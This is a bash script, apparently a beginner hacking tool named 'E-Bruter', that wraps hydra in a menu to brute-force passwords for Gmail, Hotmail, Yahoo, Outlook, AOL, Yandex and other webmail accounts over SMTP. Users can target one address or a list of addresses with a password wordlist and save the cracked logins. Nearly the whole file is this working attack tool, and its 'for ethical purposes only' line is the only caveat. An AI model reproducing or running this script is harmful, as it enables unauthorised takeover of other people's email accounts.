#!/bin/bash
#   <=: INFO :=>
# Author: James Rock
# Facebook: www.facebook.com/Wicked.W0lf
# ! FOR ETHICAL PURPOSES ONLY !
# For absolute beginners

#BARVY

red="\033[1;31m"
green="\033[1;32m"
blue="\033[1;34m"
white="\033[97m"
nc="\e[0m"

#BANNER
clear
echo -e "$nc"
echo -e "$nc"
echo -e "$red	███████╗$nc       $green██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗ "
echo -e "$red 	██╔════╝$nc       $green██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗"
echo -e "$red 	█████╗  $nc$blue█████╗$nc $green██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝"
echo -e "$red 	██╔══╝  $nc$blue╚════╝$nc $green██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗"
echo -e "$red 	███████╗$nc       $green██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║"
echo -e "$red	╚══════╝$nc       $green╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝"


#VYBER

echo ""
echo -e "	       $blue <=:Select the SMTP service from the menu:=> $nc"
echo ""
echo -e "$green	    ΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞ"
echo -e "	    Ξ	  					     Ξ"
echo -e "	    Ξ	$red 1 : Hotmail	4 : Yandex     7 : Aol      $nc$green Ξ"
echo -e "	    Ξ						     Ξ"
echo -e	"	    Ξ	$red 2 : Gmail	5 : Mail       8 : Email    $nc$green Ξ"
echo -e "	    Ξ						     Ξ"
echo -e "	    Ξ	$red 3 : Yahoo	6 : Outlook    9 : Post    $nc$green  Ξ"
echo -e "	    Ξ                                                Ξ"
echo -e "	    ΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞ"
echo -e "\n $green"
read -p " Select : " cislo

#AKCE

if [ $cislo = 1 ]; then
  smtp1=smtp.live.com
  echo ""
  read -p "[HOTMAIL] [1] File with Emails / [2] Single Email : " file
    if [ $file = 1 ]; then
       read -p "[HOTMAIL] Enter the file location : " soubor
       read -p "[HOTMAIL] Enter the wordlist location : " wordlist
       read -p "[HOTMAIL] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -p "[HOTMAIL] Enter the file location : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp1 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp1 smtp
   fi
    elif [ $file = 2 ]; then
	   read -p "[HOTMAIL] Enter Email : " email
	   read -p "[HOTMAIL] Enter the wordlist location : " wordlist
	   read -p "[HOTMAIL] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -p "[HOTMAIL] Enter the file location : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp1 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp1 smtp
fi
fi

elif [ $cislo = 2 ]; then
  smtp2=smtp.gmail.com
  echo ""
  read -p "[GMAIL] [1] File with Emails / [2] Single Email : " file
    if [ $file = 1 ]; then
       read -p "[GMAIL] Enter the file location : " soubor
       read -p "[GMAIL] Enter the wordlist location : " wordlist
       read -p "[GMAIL] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -p "[GMAIL] Enter the file location : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp2 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp2 smtp
   fi
    elif [ $file = 2 ]; then
	   read -p "[GMAIL] Enter Email : " email
	   read -p "[GMAIL] Enter the wordlist location : " wordlist
	   read -p "[GMAIL] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -p "[GMAIL] Enter the file location : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp2 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp2 smtp
fi
fi

elif [ $cislo = 3 ]; then
  smtp3=smtp.mail.yahoo.com
  echo ""
  read -p "[YAHOO] [1] File with Emails / [2] Single Email : " file
    if [ $file = 1 ]; then
       read -p "[YAHOO] Enter the file location : " soubor
       read -p "[YAHOO] Enter the wordlist location : " wordlist
       read -p "[YAHOO] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -p "[YAHOO] Enter the file location : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp3 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp3 smtp
   fi
    elif [ $file = 2 ]; then
	   read -p "[YAHOO] Enter Email : " email
	   read -p "[YAHOO] Enter the wordlist location : " wordlist
	   read -p "[YAHOO] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -p "[YAHOO] Enter the file location : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp3 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp3 smtp
fi
fi

elif [ $cislo = 4 ]; then
  smtp4=smtp.yandex.com
  echo ""
  read -p "[YANDEX] [1] File with Emails / [2] Single Email : " file
    if [ $file = 1 ]; then
       read -p "[YANDEX] Enter the file location : " soubor
       read -p "[YANDEX] Enter the wordlist location : " wordlist
       read -p "[YANDEX] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -p "[YANDEX] Enter the file location : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp4 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp4 smtp
   fi
    elif [ $file = 2 ]; then
	   read -p "[YANDEX] Enter Email : " email
	   read -p "[YANDEX] Enter the wordlist location : " wordlist
	   read -p "[YANDEX] Do you want to store found logins? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -p "[YANDEX] Enter the file location : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp4 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp4 smtp
fi
fi

elif [ $cislo = 5 ]; then
  smtp5=smtp.mail.com
  echo ""
read -p "[MAIL] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -p "[MAIL] Enter the file location : " soubor
     read -p "[MAIL] Enter the wordlist location : " wordlist
     read -p "[MAIL] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -p "[MAIL] Enter the file location : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp5 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp5 smtp
 fi
  elif [ $file = 2 ]; then
   read -p "[MAIL] Enter Email : " email
   read -p "[MAIL] Enter the wordlist location : " wordlist
   read -p "[MAIL] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -p "[MAIL] Enter the file location : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp5 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp5 smtp
fi
fi

elif [ $cislo = 6 ]; then
  smtp6=smtp-mail.outlook.com
  echo ""
read -p "[OUTLOOK] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -p "[OUTLOOK] Enter the file location : " soubor
     read -p "[OUTLOOK] Enter the wordlist location : " wordlist
     read -p "[OUTLOOK] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -p "[OUTLOOK] Enter the file location : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp6 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp6 smtp
 fi
  elif [ $file = 2 ]; then
   read -p "[OUTLOOK] Enter Email : " email
   read -p "[OUTLOOK] Enter the wordlist location : " wordlist
   read -p "[OUTLOOK] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -p "[OUTLOOK] Enter the file location : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp6 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp6 smtp
fi
fi

elif [ $cislo = 7 ]; then
  smtp7=smtp.aol.com
  echo ""
read -p "[AOL] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -p "[AOL] Enter the file location : " soubor
     read -p "[AOL] Enter the wordlist location : " wordlist
     read -p "[AOL] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -p "[AOL] Enter the file location : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp7 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp7 smtp
 fi
  elif [ $file = 2 ]; then
   read -p "[AOL] Enter Email : " email
   read -p "[AOL] Enter the wordlist location : " wordlist
   read -p "[AOL] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -p "[AOL] Enter the file location : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp7 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp7 smtp
fi
fi

elif [ $cislo = 8 ]; then
  smtp8=smtp.email.com
  echo ""
read -p "[EMAIL] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -p "[EMAIL] Enter the file location : " soubor
     read -p "[EMAIL] Enter the wordlist location : " wordlist
     read -p "[EMAIL] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -p "[EMAIL] Enter the file location : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp8 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp8 smtp
 fi
  elif [ $file = 2 ]; then
   read -p "[EMAIL] Enter Email : " email
   read -p "[EMAIL] Enter the wordlist location : " wordlist
   read -p "[EMAIL] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -p "[EMAIL] Enter the file location : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp8 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp8 smtp
fi
fi

elif [ $cislo = 9 ]; then
  smtp9=smtp.post.com
  echo ""
read -p "[POST] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -p "[POST] Enter the file location : " soubor
     read -p "[POST] Enter the wordlist location : " wordlist
     read -p "[POST] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -p "[T-MOBILE] Enter the file location : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp9 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp9 smtp
 fi
  elif [ $file = 2 ]; then
   read -p "[POST] Enter Email : " email
   read -p "[POST] Enter the wordlist location : " wordlist
   read -p "[POST] Do you want to store found logins? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -p "[POST] Enter the file location : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp9 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp9 smtp
fi
fi
else
 echo -e " \033[7;31m WRONG INPUT! $nc"
exit 1
fi
